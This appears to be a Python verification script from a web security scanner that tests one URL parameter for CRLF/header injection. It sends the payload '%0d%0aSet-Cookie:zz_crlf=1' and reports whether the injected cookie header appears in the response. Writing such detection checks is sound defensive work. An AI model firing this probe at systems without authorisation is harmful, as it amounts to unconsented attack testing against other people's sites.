#!/usr/bin/env python3
"""Standalone Verification Skill Script: CRLF / Header Injection."""
from __future__ import annotations

import argparse
import asyncio
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[4]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from net.client import fetch
from verification.doctrine import CONFIRMED
from verification.playbooks.crlf import evaluate_crlf_response


def main() -> int:
    parser = argparse.ArgumentParser(description="TSMSS CRLF Verification Skill")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--param", required=True, help="Parameter name")
    args = parser.parse_args()

    delim = "&" if "?" in args.url else "?"
    test_url = f"{args.url}{delim}{args.param}=%0d%0aSet-Cookie:zz_crlf=1"

    async def _test() -> tuple[bool, str]:
        resp = await fetch(test_url)
        return evaluate_crlf_response(resp.headers, injected_header_name="set-cookie", injected_marker="zz_crlf=1")

    ok, reason = asyncio.run(_test())
    payload = {
        "class": "CRLF",
        "url": args.url,
        "param": args.param,
        "confidence": CONFIRMED if ok else "CANDIDATE",
        "evidence": reason,
    }
    print(json.dumps(payload, indent=2))
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
